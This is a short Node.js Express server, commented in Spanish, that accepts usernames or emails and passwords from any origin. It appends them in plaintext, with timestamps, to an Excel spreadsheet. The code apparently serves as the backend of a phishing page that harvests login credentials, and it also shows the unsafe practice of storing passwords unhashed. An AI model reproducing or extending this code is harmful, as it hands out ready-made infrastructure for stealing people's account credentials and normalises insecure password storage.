import express from 'express';
import cors from 'cors';
import XLSX from 'xlsx';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());

const excelFilePath = path.join(__dirname, 'credenciales.xlsx');

// Endpoint para guardar credenciales
app.post('/api/save-credentials', (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: 'Faltan credenciales' });
    }

    let workbook;
    let worksheet;
    let data = [];

    // Verificar si el archivo Excel existe
    if (fs.existsSync(excelFilePath)) {
      // Leer el archivo existente
      workbook = XLSX.readFile(excelFilePath);
      worksheet = workbook.Sheets[workbook.SheetNames[0]];
      data = XLSX.utils.sheet_to_json(worksheet);
    }

    // Agregar nueva entrada con timestamp
    data.push({
      'Fecha y Hora': new Date().toLocaleString('es-ES'),
      'Usuario/Email': username,
      'Contraseña': password
    });

    // Crear nuevo workbook
    const newWorkbook = XLSX.utils.book_new();
    const newWorksheet = XLSX.utils.json_to_sheet(data);

    // Ajustar el ancho de las columnas
    newWorksheet['!cols'] = [
      { wch: 20 },
      { wch: 30 },
      { wch: 20 }
    ];

    XLSX.utils.book_append_sheet(newWorkbook, newWorksheet, 'Credenciales');

    // Guardar el archivo
    XLSX.writeFile(newWorkbook, excelFilePath);

    console.log('Credenciales guardadas:', { username, timestamp: new Date().toLocaleString('es-ES') });

    res.json({ success: true, message: 'Credenciales guardadas' });
  } catch (error) {
    console.error('Error al guardar credenciales:', error);
    res.status(500).json({ error: 'Error al guardar credenciales' });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
  console.log(`Las credenciales se guardarán en: ${excelFilePath}`);
});
